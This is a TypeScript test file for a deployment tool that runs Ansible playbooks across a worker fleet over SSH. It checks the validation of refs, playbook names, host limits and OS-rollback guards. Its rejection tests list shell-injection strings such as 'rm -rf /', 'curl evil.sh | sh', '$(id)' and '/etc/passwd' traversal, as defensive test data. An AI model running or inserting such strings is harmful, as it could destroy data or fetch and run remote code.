/**
 * The ref reaches a remote shell, so its SHAPE is the containment.
 *
 * `ssh` joins its arguments into a single string the remote shell interprets, whatever the local caller
 * passes — so unlike `command: argv:` in Ansible, there is no structural escape here and the value has to
 * be constrained instead. Same rule as `isValidCaptureId`: make the dangerous thing inexpressible rather
 * than trying to reject it, on the machine that holds the fleet SSH key of all places.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { validRef, PLAYBOOKS, LIMIT_PATTERN, SERIAL_PATTERN, PLAYBOOK_TIMEOUT_MS, DEFAULT_PLAYBOOK_TIMEOUT_MS,
  onTheControlPlane, journalScope, controlPlaneCheckout, osRollbackRefusal, staleRefRefusal }
  from "./fleet-playbook.mjs";

test("commits and ordinary branch names are accepted", () => {
  for (const ref of ["afec73d", "65ead9b1c2d3e4f5", "main", "v8-feature-schema", "origin/main", "v1.2.3"]) {
    assert.equal(validRef(ref), true, ref);
  }
});

test("anything that could reach a shell is refused", () => {
  for (const ref of [
    "main; rm -rf /", "main && curl evil.sh | sh", "$(id)", "`id`", "main | tee /etc/passwd",
    "main\nrm -rf /", "main > /etc/cron.d/x", "a'b", 'a"b', "main&", "",
  ]) {
    assert.equal(validRef(ref), false, JSON.stringify(ref));
  }
});

test("path traversal is refused even though slashes are legal in a ref", () => {
  // `origin/main` must work, so slashes cannot simply be banned — which is exactly what makes `..` its
  // own check rather than something the character class already covers.
  assert.equal(validRef("origin/main"), true);
  assert.equal(validRef("../../etc/passwd"), false);
  assert.equal(validRef("main/../../../root"), false);
});

test("an over-long ref is refused, so the bound is real rather than assumed", () => {
  assert.equal(validRef("a".repeat(64)), true);
  assert.equal(validRef("a".repeat(65)), false);
});

test("only the named playbooks are runnable, and they are names rather than paths", () => {
  // The same containment as `-e out=<name>` in lab-job.yml. This value reaches a shell on the box that
  // holds the fleet SSH key, so an arbitrary path here is an arbitrary playbook run against twelve
  // Windows machines.
  // `recover.yml` joined on 2026-09-02 and the addition is deliberate rather than convenient: it kills a
  // node process and REBOOTS, which is the most destructive thing this allowlist permits. It earns that
  // because the fault it exists for cannot be reached any other way — a worker wedged inside a capture
  // does not respond to `Stop-ScheduledTask`, keeps the port, and goes on serving a matching
  // `/health.code` from files the deploy has just updated, so `verify-code.yml`'s reboot never fires.
  // `os-rollback.yml` joined on 2026-09-11 (#921) and displaced `recover.yml` as the most destructive entry:
  // it rolls a box's WINDOWS BUILD back. It earns its place the same way -- a feature update that slipped
  // the appliance policy had no remote repair at all -- and it is fenced harder than anything else here:
  // one named worker or nothing, and a read-only dry run unless `--apply` (tests below).
  assert.deepEqual(PLAYBOOKS, ["deploy.yml", "sleep.yml", "provision-role.yml", "recover.yml",
    "inventory-install.yml", "control-host-install.yml", "os-rollback.yml"]);
  // `provision.yml` stays REFUSED and that is not an oversight: it is the UTM/PowerShell provisioning
  // playbook, a different file from `provision-role.yml`, and only the role one should be reachable from
  // a laptop. Two files one character apart, one allowed and one not, is exactly what an allowlist is for.
  for (const bad of ["../../../etc/evil.yml", "provision.yml", "/tmp/x.yml", "deploy.yml; id"]) {
    assert.equal(PLAYBOOKS.includes(bad), false, bad);
  }
});

test("fleet:wake is deliberately NOT one of these", () => {
  // Wake sends Wake-on-LAN magic packets — UDP broadcasts on the LAN, no SSH — so it runs fine from a
  // laptop and routing it through the control plane would add a hop for nothing. Everything that has to
  // talk TO a worker needs the key, and that is the line this list draws.
  assert.equal(PLAYBOOKS.includes("wake.yml"), false);
});

test("--limit takes worker names, and nothing that could reach a shell", () => {
  for (const ok of ["a11y-worker-3", "a11y-worker-3,a11y-worker-4,a11y-worker-5", "a11y_workers"]) {
    assert.equal(LIMIT_PATTERN.test(ok), true, ok);
  }
  for (const bad of [
    "a11y-worker-3; id", "*", "!a11y-worker-2", "a11y-worker-3 a11y-worker-4", "$(id)",
    "../etc", "a11y-worker-3,", "", "all",
  ]) {
    assert.equal(LIMIT_PATTERN.test(bad), false, JSON.stringify(bad));
  }
});

test("a playbook that installs software gets a budget bigger than the default", () => {
  // `provision-role.yml` installs NVDA and an Edge MSI with `serial: 1`, so five boxes is five sequential
  // installs. At the 30-minute default the SSH is killed mid-provision, which leaves a box half
  // configured and a stamp that may or may not have been written — and `fleet:status` then reports
  // INCONSISTENT, which reads like a provisioning bug rather than a timeout.
  assert.ok(PLAYBOOK_TIMEOUT_MS["provision-role.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "provisioning needs longer than a deploy; a ceiling that expires early turns still-working into failed");
  for (const name of Object.keys(PLAYBOOK_TIMEOUT_MS)) {
    assert.ok(PLAYBOOKS.includes(name), `${name} has a timeout but is not a runnable playbook`);
  }
});

test("provisioning REFUSES a worker mid-capture, rather than serialising around it", () => {
  // The design error this replaced: `serial: 1` carried the comment "matters if a run is in flight
  // against the others", which defends a situation that must never be allowed. Provisioning during a run
  // restarts a worker mid-capture (12–520 s of unresumable work) AND moves provisionRevision on some
  // boxes and not others — a capture cache key and a fleet-consistency MUST_MATCH field. That is a
  // mitigation standing in for a refusal, and `sleep.yml` already had the refusal twenty lines away.
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  const executable = play.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(executable, /provision_busy_check\.json\.busy/,
    "provision-role.yml must ask each worker whether it is capturing before touching it");
  assert.match(executable, /ansible\.builtin\.fail:/,
    "a busy worker must FAIL the play, not be skipped: a partially-provisioned fleet is the INCONSISTENT "
    + "state that stops every capture run, so skipping the busy box is the worst option here");
  // Asked over HTTP from the control plane — the same channel the dispatcher uses — so the two cannot
  // disagree about "busy". Over SSH it would be a different question answered a different way.
  assert.match(executable, /url: "http:\/\/\{\{ ansible_host \}\}:\{\{ a11y_port \}\}\/health"/);
});

test("the provisioning batch size is a choice, contained by shape", () => {
  for (const ok of ["0", "1", "6", "99"]) assert.equal(SERIAL_PATTERN.test(ok), true, ok);
  for (const bad of ["", "-1", "1;id", "$(id)", "100", "01", "1.5", " 1"]) {
    assert.equal(SERIAL_PATTERN.test(bad), false, JSON.stringify(bad));
  }
  const play = readFileSync(
    fileURLToPath(new URL("../ansible/provision-role.yml", import.meta.url)), "utf8");
  assert.match(play, /serial: "\{\{ worker_provision_serial \| default\(1\) \}\}"/,
    "serial must be overridable, and must still default to 1 — fail-fast on a role you just changed");
});

test("the provision stamp is the ENVIRONMENT, not the moment it was applied", () => {
  // `provisionRevision` is a capture cache key AND a fleet-consistency MUST_MATCH field. While it carried
  // a git SHA, any commit — including one touching nothing a capture can observe — changed it, so:
  // re-provisioning after a docs change invalidated every cached capture, and a box provisioned minutes
  // after its peers read INCONSISTENT and blocked every run. Measured 2026-08-25 when a11y-worker-6 failed
  // and could not be re-run alone, because HEAD had moved and four healthy boxes faced re-provisioning.
  //
  // This repo already made the same call one field over: workerCode is deliberately OUTSIDE the cache key
  // because "it changes when a comment changes". A git SHA changes for strictly more reasons.
  const script = readFileSync(fileURLToPath(
    new URL("../../worker-fleet/src/provisioning/stamp-provision-revision.ps1", import.meta.url)), "utf8");
  const code = script.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");

  assert.match(code, /^\$stamp = \$combined$/m,
    "the stamp must be the content hash alone — no SHA, no date, nothing that moves on its own");
  assert.ok(!/\$stamp = "\$\(if \(\$gitSha\)/.test(code),
    "the SHA-prefixed stamp is back; it churns a capture cache key for commits that change nothing");
  // Still RECORDED, because losing it would trade one problem for a diagnostic gap.
  assert.match(code, /provision-commit\.txt/,
    "the commit must still be written somewhere for diagnosis, just not into the key");
});

/**
 * A MACHINE MUST NOT SSH TO ITSELF — and this is how a fleet-bearing pipeline broke.
 *
 * `lab:pipeline` dispatches itself to the control plane as a systemd unit and re-runs there with
 * `--local`, so every stage of a fleet-bearing pipeline executes ON the box this script otherwise SSHes
 * to. Root-to-root over the lab key is not authorised there, and the failure reads `Permission denied
 * (publickey,password)` — which looks like a broken key rather than a machine talking to itself.
 *
 * Measured 2026-08-29: `--pipeline=verify` died at stage 1 of 4 with exactly that, twice, and the second
 * time only because the first failure (a package-name import) had masked it.
 */
test("running ON the control plane is detected, so commands go to a shell and not through ssh", () => {
  const here = { en0: [{ address: "203.0.113.172" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(here, "203.0.113.172"), true);
});

test("a laptop on the same LAN is NOT the control plane", () => {
  // The failure that would matter more: deciding we are the control plane when we are not sends every
  // deploy command to the wrong filesystem, silently, and it would look like a checkout that never moved.
  const laptop = { en0: [{ address: "REDACTED-INTERNAL-ADDRESS" }], lo0: [{ address: "127.0.0.1" }] };
  assert.equal(onTheControlPlane(laptop, "203.0.113.172"), false);
});

test("an interface with no address does not throw or match", () => {
  // `networkInterfaces()` returns undefined for an interface in some states, and `.flat()` keeps the hole.
  assert.equal(onTheControlPlane({ en0: undefined, lo0: [{ }] }, "203.0.113.172"), false);
});

test("the journal a deploy streams is bounded to THIS run, not the unit's whole history", () => {
  // `journalctl -u <unit>` returns every run since boot, oldest first. Measured 2026-09-05: a deploy that
  // correctly REFUSED a busy fleet (`failed=1`, `changed=0`) was read as having deployed, because the PLAY
  // RECAP printed above the refusal was the successful run from seven minutes earlier. Same defect
  // CLAUDE.md records as having cost three wrong readings, arriving in the one place with no bound at all.
  assert.equal(journalScope("a11y-fleet-deploy", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8"),
    "_SYSTEMD_INVOCATION_ID=3f2a1b9c4d5e6f708192a3b4c5d6e7f8");
});

test("no InvocationID falls back to the whole unit, because absent must not look like empty", () => {
  // `lab-status.yml` learned this first: scoping on an id a released unit no longer has returned
  // `-- No entries --`, "a status tool showing nothing where there is plenty, which is worse than showing
  // too much". The caller says so in a line of its own when this branch is taken.
  assert.equal(journalScope("a11y-fleet-deploy", ""), "-u a11y-fleet-deploy");
});

test("anything that is not an invocation id is refused, not interpolated", () => {
  // This value reaches a remote shell on the machine holding the fleet SSH key, so the containment is its
  // SHAPE — the same rule `validRef` follows. `systemctl show` returns 32 hex characters or nothing; every
  // other answer is a broken control plane, and a broken control plane must not become a command.
  for (const bad of [
    "; rm -rf /", "$(id)", "`id`", "3f2a1b9c4d5e6f708192a3b4c5d6e7f8 ; id", "abc", "../../etc",
    "3F2A1B9C4D5E6F708192A3B4C5D6E7F8", "3f2a1b9c4d5e6f708192a3b4c5d6e7f",
  ]) {
    assert.equal(journalScope("a11y-fleet-deploy", bad), "-u a11y-fleet-deploy", JSON.stringify(bad));
  }
});

test("THE CONTROL PLANE IS SENT A COMMIT, NEVER A NAME IT WOULD RESOLVE ITSELF (#666)", () => {
  // The whole defect in one assertion. This command used to end `merge --ff-only origin/${ref}`, so the
  // control plane resolved the ref from a fetch it performed SECONDS AFTER the operator resolved it here.
  // Equal only when nothing merged in between — and on 2026-09-09, with main merging every few minutes,
  // three consecutive deploys failed on it while all nine boxes were healthy.
  const command = controlPlaneCheckout("HEAD", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /merge --ff-only --quiet d2729386d6b8807cf610c6e620173930020798a5$/,
    `the merge target must be the resolved commit:\n${command}`);
  assert.doesNotMatch(command, /merge[^\n]*origin\//,
    "merging `origin/<ref>` is the bug: it is a second, later resolution of the same question");
});

test("but the CHECKOUT is still a name, because a bare SHA would detach the control plane (#666)", () => {
  // Not symmetry for its own sake. `localBranch()`'s own comment records what a bare SHA costs anything
  // doing `origin/<ref>`, and a detached control plane is a different failure from a stale one. The name
  // selects the branch; the SHA decides where it lands; only the SHA is compared afterwards.
  const command = controlPlaneCheckout("main", "d2729386d6b8807cf610c6e620173930020798a5");

  assert.match(command, /git checkout --quiet main /,
    `the checkout target stays the branch name:\n${command}`);
  assert.match(command, /git fetch --quiet --all/,
    "the fetch has to come first, or the commit is not in the object store to merge to");
  assert.ok(command.indexOf("checkout") < command.indexOf("merge"),
    `checkout must precede merge:\n${command}`);
});

test("`HEAD` is the DEFAULT ref on the checkout this command is meant to be run from (#666)", () => {
  // Why the race is the default path rather than an edge case: `localBranch()` is `rev-parse --abbrev-ref
  // HEAD`, which is the literal string "HEAD" when detached — and the primary checkout is detached by
  // design AND by hook (`post-checkout` puts it back). So the un-flagged deploy sent `origin/HEAD`, main's
  // tip at whatever instant the control plane fetched.
  const command = controlPlaneCheckout("HEAD", "abc1234def5678");

  // `git checkout HEAD` is a deliberate no-op — it is the merge that moves the checkout, and it moves it
  // to one commit rather than to a branch tip that has since advanced.
  assert.match(command, /git checkout --quiet HEAD /, command);
  assert.match(command, /merge --ff-only --quiet abc1234def5678$/, command);
});

test("an OS rollback names exactly ONE worker, and --apply belongs to it alone (#921)", () => {
  // "No --limit" means the whole fleet everywhere else, which is right for a deploy and the one target a
  // Windows rollback must never have. A list is refused too: one box's OS at a time.
  for (const limitFlag of [undefined, "a11y_workers", "a11y-worker-3,a11y-worker-4", ""]) {
    assert.match(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag, apply: false }) ?? "",
      /without --limit=<one worker>/, JSON.stringify(limitFlag));
  }
  assert.equal(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag: "a11y-worker-4", apply: false }), null);
  assert.equal(osRollbackRefusal({ chosen: "os-rollback.yml", limitFlag: "a11y-worker-4", apply: true }), null);
  // Accepted and ignored would be the silently-discarded flag this repo refuses everywhere else.
  for (const chosen of PLAYBOOKS.filter((name) => name !== "os-rollback.yml")) {
    assert.match(osRollbackRefusal({ chosen, limitFlag: "a11y-worker-4", apply: true }) ?? "",
      /refusing --apply/, chosen);
    assert.equal(osRollbackRefusal({ chosen, limitFlag: undefined, apply: false }), null, chosen);
  }
  assert.ok(PLAYBOOK_TIMEOUT_MS["os-rollback.yml"] > DEFAULT_PLAYBOOK_TIMEOUT_MS,
    "a rollback runs inside a restart that can take most of an hour; the default ceiling would kill it");
});

test("the rollback playbook refuses before it acts, and its dry run is itself (#921)", () => {
  const play = readFileSync(fileURLToPath(new URL("../ansible/os-rollback.yml", import.meta.url)), "utf8");
  const executable = play.split("\n").filter((line) => !line.trimStart().startsWith("#")).join("\n");
  const at = (pattern: RegExp) => executable.search(pattern);

  // Each guard is present, and each comes BEFORE the first task that changes anything.
  const firstChange = at(/Initiate-OSUninstall/);
  const guards: [string, RegExp][] = [
    ["one host", /ansible_play_hosts_all \| length == 1/],
    ["the others agree on one build", /rollback_fleet_builds \| unique \| length == 1/],
    // AHEAD, not merely different: worker-judge's review found "differs" passed a box one build BEHIND and
    // a box on the same build in another edition, and DISM would have taken either further from the fleet.
    ["the same edition as the fleet", /rollback_this_edition == rollback_fleet_edition/],
    ["a build strictly AHEAD of the fleet's", /rollback_this_number \| int > rollback_fleet_number \| int/],
    ["not mid-capture", /rollback_before\.json\.busy/],
    ["the dry run stops here", /ansible\.builtin\.meta: end_host\s+when: not os_rollback_apply/],
    ["a closed path is refused", /rollback_found\.windowDays \| int > 0/],
  ];
  assert.ok(firstChange > 0, "the playbook must contain the change it guards");
  for (const [name, pattern] of guards) {
    const where = at(pattern);
    assert.ok(where >= 0, `guard missing: ${name}`);
    assert.ok(where < firstChange, `guard AFTER the change it exists to prevent: ${name}`);
  }
  // Busy is asked over HTTP from the control plane, the same channel `deploy.yml` asks on.
  assert.match(executable, /url: "http:\/\/\{\{ ansible_host \}\}:\{\{ a11y_port \}\}\/health"/);
  // The apply switch has exactly one spelling, the one `fleet-playbook.mjs` passes.
  assert.match(executable, /a11y_os_rollback_apply \| default\(false\)/);
  // The proof is the build /health reports afterwards, not DISM's exit code.
  assert.match(executable, /rollback_after\.json\.environment\.windowsVersion/);
  // The restart is not assumed either way: a stage that loses its connection (DISM restarting the box
  // itself) is tolerated, and a restart is asked for only when the box is still there to be asked.
  assert.match(executable, /register: rollback_staged\s+ignore_unreachable: true/);
  assert.match(executable, /when: not \(rollback_staged\.unreachable \| default\(false\)\)/);
});

// --- #971: A REF THAT MEANS SOMETHING DIFFERENT HERE THAN ON ORIGIN ---
//
// `expected` is `git rev-parse <ref>` IN THIS CHECKOUT, and on a machine with worktrees a local branch
// sits wherever the last worktree left it. Measured 2026-09-11: `primary:update` put the local `main` on
// f0d69cb7 at 05:44Z; by the deploy, origin/main was 25a5f680. The control plane shipped f0d69cb7 and THE
// READ-BACK PASSED -- both halves of that check use the same stale SHA, so it is internally consistent and
// a merge behind. `worker:code` found it afterwards as 10 of 10 STALE.
//
// The trap was already written in this file's own comments ("`--ref=main` is not the fix and makes it
// worse") and nothing refused it. These test the refusal, not the comment.
//
// PURE, over two resolved SHAs, and that is the row's own condition: the real deploy path is
// orchestrator's and nobody else runs it. What these CANNOT establish is that the refusal happens before
// anything is shipped -- that is placement in `main` (ahead of `requireCommitIsOnOrigin` and the first
// `ssh`), and asserting it by reading this file's source is the wiring-not-behaviour defect this same file
// records against #645's first attempt. It is stated on the PR rather than faked with a source scrape.

const SHA = (c: string) => c.repeat(40);

test("#971 ACCEPTANCE: a ref resolving to a different commit on origin is REFUSED, naming both SHAs and "
  + "the way out", () => {
  const refusal = staleRefRefusal({ ref: "main", local: "f0d69cb7" + "a".repeat(32),
    origin: "25a5f680" + "b".repeat(32) })!;
  assert.ok(refusal, "a stale local branch must not deploy silently");
  assert.match(refusal, /^REFUSING:/, "the first word must say what happened");
  assert.match(refusal, /f0d69cb7aaaa/, "the SHA it would have shipped");
  assert.match(refusal, /25a5f680bbbb/, "and the SHA origin holds, so the operator can see which is which");
  assert.match(refusal, /npm run primary:update/, "the fix the row asked to be named");
  // BOTH WAYS OUT, not one. A local tip that differs may be BEHIND origin or AHEAD of it, and telling an
  // operator to fast-forward when they meant to ship unpushed work is a refusal that cannot be followed.
  assert.match(refusal, /push it, and pass --ref=/);
});

test("#971: agreement is silent -- the ordinary deploy must not acquire a new way to fail", () => {
  assert.equal(staleRefRefusal({ ref: "main", local: SHA("a"), origin: SHA("a") }), null);
  assert.equal(staleRefRefusal({ ref: "HEAD", local: SHA("b"), origin: SHA("b") }), null,
    "`HEAD` is the DEFAULT ref on the detached primary, which is where this command is meant to be run "
    + "from -- if this ever refused, every ordinary deploy would stop");
});

test("#971: `HEAD` is checked like any other ref, and it is the case that actually bit -- the primary is "
  + "detached by design, so `localBranch()` returns the literal string HEAD", () => {
  const refusal = staleRefRefusal({ ref: "HEAD", local: SHA("d"), origin: SHA("e") })!;
  assert.ok(refusal, "a detached primary behind origin/main is exactly the 2026-09-11 incident");
  assert.match(refusal, /origin\/HEAD/);
});

test("#971: an UNRESOLVABLE `origin/<ref>` is refused, never read as agreement -- could-not-ask answering "
  + "clear is this repository's most expensive recurring shape", () => {
  const refusal = staleRefRefusal({ ref: "local-only", local: SHA("c"), origin: null })!;
  assert.ok(refusal);
  assert.match(refusal, /does not resolve/);
  // AND ITS REMEDIES ARE DIFFERENT ONES. `primary:update` cannot help a branch origin has never seen, so
  // offering it here would be a message that reads like help and is not.
  assert.match(refusal, /git push -u origin local-only/);
  assert.doesNotMatch(refusal, /To deploy origin's tip/,
    "the stale-branch remedy must not be pasted onto a case it cannot fix");
});

test("#971: both SHAs are column-aligned, and a long ref name degrades rather than throwing", () => {
  const lines = staleRefRefusal({ ref: "main", local: SHA("1"), origin: SHA("2") })!.split("\n");
  const local = lines.find((l) => l.includes("this checkout"))!;
  const origin = lines.find((l) => l.includes("origin/main:"))!;
  assert.equal(local.indexOf(SHA("1").slice(0, 12)), origin.indexOf(SHA("2").slice(0, 12)),
    "the two SHAs must start in the same column -- the eye lands on the digits that differ");
  const long = "agent/" + "x".repeat(60);
  assert.doesNotThrow(() => staleRefRefusal({ ref: long, local: SHA("1"), origin: SHA("2") }),
    "a negative repeat count would throw; alignment is cosmetic and must degrade, never fail");
});

test("#971: the comparison is on the resolved COMMITS, so an abbreviated SHA is not equal to its full "
  + "form -- `git rev-parse` gives both sides the full 40, and anything shorter reaching here is a bug "
  + "this must not paper over", () => {
  assert.ok(staleRefRefusal({ ref: "main", local: SHA("a"), origin: SHA("a").slice(0, 12) }),
    "two spellings of the same commit must still refuse -- equality here is the whole check, and "
    + "accepting a prefix would make it a substring test that passes on any shared prefix");
});
